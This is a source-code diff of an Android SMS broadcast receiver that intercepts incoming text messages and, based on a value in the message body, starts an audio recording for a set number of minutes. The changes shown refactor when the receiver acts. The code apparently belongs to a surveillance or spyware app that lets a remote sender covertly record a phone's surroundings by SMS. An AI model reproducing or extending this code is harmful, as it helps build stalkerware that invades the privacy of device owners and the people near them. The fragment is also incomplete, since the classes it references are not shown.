@@ -8,10 +8,8 @@ import android.annotation.SuppressLint;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
-import android.content.SharedPreferences;
 import android.net.Uri;
 import android.os.Bundle;
-import android.preference.PreferenceManager;
 import android.telephony.SmsMessage;
 
 import com.inet.android.audio.RecordAudio;
@@ -20,7 +18,7 @@ import com.inet.android.request.ConstantRequest;
 import com.inet.android.request.DataRequest;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
-import com.inet.android.utils.WorkTimeDefiner;
+import com.inet.android.utils.WhileTheMethod;
 
 /**
  * SmsSentObserver class is design for monitoring incoming sms
@@ -38,26 +36,9 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 	public void onReceive(Context context, Intent intent) {
 		// Tom Xue: intent -> bundle -> Object messages[] -> smsMessage[]
 		this.mContext = context;
-		SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(mContext);
-		String sms = sp.getString("sms", "0");
 		mBundle = intent.getExtras();
-		if (sms.equals("0")) {
-			Logging.doLog(LOG_TAG, "sms : 0", "sms : 0");
-			
+		if (WhileTheMethod.getState(2, context) == 0)
 			return;
-		}
-		boolean isWork = WorkTimeDefiner.isDoWork(mContext);
-		if (!isWork) {
-			Logging.doLog(LOG_TAG, "isWork return " + Boolean.toString(isWork),
-					"isWork return " + Boolean.toString(isWork));
-			Logging.doLog(LOG_TAG, "after isWork retrun 0",
-					"after isWork retrun 0");
-
-			return;
-		} else {
-			Logging.doLog(LOG_TAG, "isWork - " + Boolean.toString(isWork),
-					"isWork - " + Boolean.toString(isWork));
-		}
 
 		try {
 			getSMSDetails();
@@ -100,8 +81,7 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 										msgs[k].getMessageBody().length())) * 60;
 						Logging.doLog(LOG_TAG, "sec: " + minute, "sec: "
 								+ minute);
-						RecordAudio recordAudio = new RecordAudio(mContext,
-								minute);
+						RecordAudio recordAudio = new RecordAudio(minute, 0);
 						recordAudio.executeRecording();
 					}
 
